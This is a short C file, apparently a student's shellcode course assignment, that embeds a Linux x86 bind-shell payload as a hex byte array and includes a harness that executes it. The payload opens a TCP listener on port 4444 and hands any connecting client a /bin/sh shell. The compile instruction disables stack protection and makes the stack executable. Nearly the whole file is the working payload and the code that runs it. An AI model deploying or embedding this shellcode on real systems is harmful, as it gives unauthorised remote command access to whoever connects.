// Student ID   : SLAE-1250
// Student Name : Jonathan "Chops" Crosby
// Assignment 1 : Shell Bind TCP (Linux/x86) Assembly
// File Name    : shellcode.c

#include<stdio.h>
#include<string.h>

//compile with: gcc shellcode.c -o shellcode -fno-stack-protector -z execstack

unsigned char code[] = \
"\x31\xc0\x50\x6a\x01\x6a\x02\x89\xe1\x31\xc0\xb0\x66\x31\xdb\xb3\x01\xcd\x80\x96\x31\xd2\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\x31\xc0\xb0\x66\xcd\x80\x6a\x01\x56\x89\xe1\x31\xdb\xb3\x04\x31\xc0\xb0\x66\xcd\x80\x31\xd2\x52\x52\x56\x89\xe1\x43\x31\xc0\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}